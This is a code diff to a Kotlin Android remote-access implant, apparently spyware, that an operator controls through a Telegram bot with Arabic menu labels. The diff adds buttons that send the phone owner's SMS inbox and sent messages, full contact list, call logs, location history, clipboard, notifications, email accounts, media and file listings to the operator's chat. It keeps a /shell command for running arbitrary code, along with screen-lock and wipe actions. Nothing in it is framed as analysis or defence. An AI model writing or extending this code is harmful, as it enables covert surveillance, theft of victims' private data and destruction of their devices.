@@ -36,8 +36,8 @@ class Dispatcher(private val ctx: Context) {
                 val cbId = cb.getString("id")
                 answer(cbId)
                 if (chatId == MY_CHAT) {
-                    sendFileFor(chatId, data)
-                    menu(chatId)
+                    doAction(chatId, data)
+                    if (data != "menu") menu(chatId)
                 }
                 continue
             }
@@ -49,37 +49,50 @@ class Dispatcher(private val ctx: Context) {
             else if (text.startsWith("/shell ")) {
                 val out = shell(text.removePrefix("/shell "))
                 Sender.sendDocument(BASE, chatId, "shell_out.txt", out)
-            } else {
-                send(chatId, "استخدم /start")
             }
         }
     }
 
-    private fun sendFileFor(chatId: String, data: String) {
+    private fun doAction(chatId: String, data: String) {
         when (data) {
-            "device"    -> file(chatId, "device.txt", c.deviceInfo())
-            "battery"   -> file(chatId, "battery.txt", c.batteryInfo())
-            "storage"   -> file(chatId, "storage.txt", c.storageInfo())
-            "location"  -> file(chatId, "location.txt", c.location())
-            "sms"       -> file(chatId, "sms_10.txt", c.sms(10))
-            "sms50"     -> file(chatId, "sms_50.txt", c.sms(50))
-            "contacts"  -> file(chatId, "contacts_20.txt", c.contacts(20))
-            "contacts50"-> file(chatId, "contacts_50.txt", c.contacts(50))
-            "calls"     -> file(chatId, "calls_10.txt", c.calls(10))
-            "calls50"   -> file(chatId, "calls_50.txt", c.calls(50))
-            "files"     -> file(chatId, "sdcard.txt", c.files("/sdcard"))
-            "downloads" -> file(chatId, "downloads.txt", c.files("/sdcard/Download"))
-            "apps"      -> file(chatId, "apps.txt", c.apps())
-            "lock"      -> lock(chatId)
-            "wipe"      -> wipe(chatId)
-            "menu"      -> {}
-            else        -> send(chatId, "زر غير معروف: $data")
+            "device"     -> file(chatId, "device.txt", c.deviceInfo())
+            "battery"    -> file(chatId, "battery_storage.txt", c.batteryStorage())
+            "storage"    -> file(chatId, "storage.txt", c.storage())
+            "network"    -> file(chatId, "network.txt", c.network())
+            "location"   -> file(chatId, "location.txt", c.location())
+            "lochist"    -> file(chatId, "location_history.txt", c.locationHistory())
+            "sms20"      -> file(chatId, "sms_20.txt", c.sms(20))
+            "sms50"      -> file(chatId, "sms_50.txt", c.sms(50))
+            "smsin"      -> file(chatId, "sms_inbox.txt", c.sms(100, "inbox"))
+            "smsout"     -> file(chatId, "sms_sent.txt", c.sms(100, "sent"))
+            "contacts30" -> file(chatId, "contacts_30.txt", c.contacts(30))
+            "contacts100"-> file(chatId, "contacts_100.txt", c.contacts(100))
+            "emails"     -> file(chatId, "emails.txt", c.emails())
+            "contactsall"-> file(chatId, "contacts_all.txt", c.contacts(9999))
+            "calls20"    -> file(chatId, "calls_20.txt", c.calls(20))
+            "calls50"    -> file(chatId, "calls_50.txt", c.calls(50))
+            "callsin"    -> file(chatId, "calls_incoming.txt", c.calls(100, "in"))
+            "callsout"   -> file(chatId, "calls_outgoing.txt", c.calls(100, "out"))
+            "callsmiss"  -> file(chatId, "calls_missed.txt", c.calls(100, "miss"))
+            "sdcard"     -> file(chatId, "sdcard.txt", c.files("/sdcard"))
+            "downloads"  -> file(chatId, "downloads.txt", c.files("/sdcard/Download"))
+            "images"     -> file(chatId, "images_50.txt", c.mediaImages(50))
+            "videos"     -> file(chatId, "videos_20.txt", c.mediaVideos(20))
+            "audio"      -> file(chatId, "audio_30.txt", c.mediaAudio(30))
+            "docs"       -> file(chatId, "documents_30.txt", c.documents(30))
+            "apps"       -> file(chatId, "apps_all.txt", c.apps())
+            "sysapps"    -> file(chatId, "apps_system.txt", c.systemApps())
+            "clipboard"  -> file(chatId, "clipboard.txt", c.clipboard())
+            "notifs"     -> file(chatId, "notifications.txt", c.notifications())
+            "lock"       -> lock(chatId)
+            "wipe"       -> wipe(chatId)
+            "menu"       -> {}
+            else         -> send(chatId, "زر غير معروف: $data")
         }
     }
 
     private fun file(chatId: String, name: String, content: String) {
         Sender.sendDocument(BASE, chatId, name, content)
-        send(chatId, "📎 $name")
     }
 
     private fun lock(chatId: String) {
@@ -117,19 +130,33 @@ class Dispatcher(private val ctx: Context) {
 
     private fun menu(chatId: String) {
         val kb = JSONArray().apply {
-            put(JSONArray().apply { put(b("📱 جهاز", "device")); put(b("🔋 بطارية", "battery")) })
-            put(JSONArray().apply { put(b("💾 ذاكرة", "storage")); put(b("📍 موقع", "location")) })
-            put(JSONArray().apply { put(b("💬 آخر 10 SMS", "sms")); put(b("💬 آخر 50 SMS", "sms50")) })
-            put(JSONArray().apply { put(b("👥 20 جهة", "contacts")); put(b("👥 50 جهة", "contacts50")) })
-            put(JSONArray().apply { put(b("📞 10 مكالمات", "calls")); put(b("📞 50 مكالمة", "calls50")) })
-            put(JSONArray().apply { put(b("📂 /sdcard", "files")); put(b("📁 التنزيلات", "downloads")) })
-            put(JSONArray().apply { put(b("📦 تطبيقات", "apps")); put(b("🔒 قفل", "lock")) })
-            put(JSONArray().apply { put(b("🗑️ تنسيق", "wipe")) })
+            put(row(b("📱 الجهاز", "device"),     b("🔋 بطارية+رام", "battery")))
+            put(row(b("💾 التخزين", "storage"),   b("🌐 IP والشبكة", "network")))
+            put(row(b("📍 الموقع", "location"),   b("🗺️ آخر مواقع", "lochist")))
+            put(row(b("💬 SMS 20", "sms20"),      b("💬 SMS 50", "sms50")))
+            put(row(b("📥 SMS واردة", "smsin"),   b("📤 SMS صادرة", "smsout")))
+            put(row(b("👥 30 جهة", "contacts30"), b("👥 100 جهة", "contacts100")))
+            put(row(b("📧 الإيميلات", "emails"),  b("👥 كل الجهات", "contactsall")))
+            put(row(b("📞 مكالمات 20", "calls20"),b("📞 مكالمات 50", "calls50")))
+            put(row(b("📥 مكالمات واردة", "callsin"), b("📤 مكالمات صادرة", "callsout")))
+            put(row(b("❌ مكالمات فائتة", "callsmiss")))
+            put(row(b("📂 /sdcard", "sdcard"),    b("📁 التنزيلات", "downloads")))
+            put(row(b("🖼️ الصور", "images"),      b("🎬 الفيديو", "videos")))
+            put(row(b("🎵 الموسيقى", "audio"),    b("📄 المستندات", "docs")))
+            put(row(b("📦 كل التطبيقات", "apps"),  b("⚙️ تطبيقات النظام", "sysapps")))
+            put(row(b("📋 الحافظة", "clipboard"),  b("🔔 الإشعارات", "notifs")))
+            put(row(b("🔒 قفل الشاشة", "lock"),   b("🗑️ تنسيق", "wipe")))
         }
         val mk = JSONObject().put("inline_keyboard", kb)
-        val p = "chat_id=$chatId&text=" + URLEncoder.encode("🎛️ لوحة التحكم", "UTF-8") +
+        val p = "chat_id=$chatId&text=" + URLEncoder.encode("🎛️ لوحة التحكم — ٢٦ زر", "UTF-8") +
                 "&reply_markup=" + URLEncoder.encode(mk.toString(), "UTF-8")
         try { Sender.post("$BASE/sendMessage", p) } catch (_: Exception) {}
+    }
+
+    private fun row(vararg items: JSONObject): JSONArray {
+        val a = JSONArray()
+        for (x in items) a.put(x)
+        return a
     }
 
     private fun b(t: String, d: String) = JSONObject().put("text", t).put("callback_data", d)
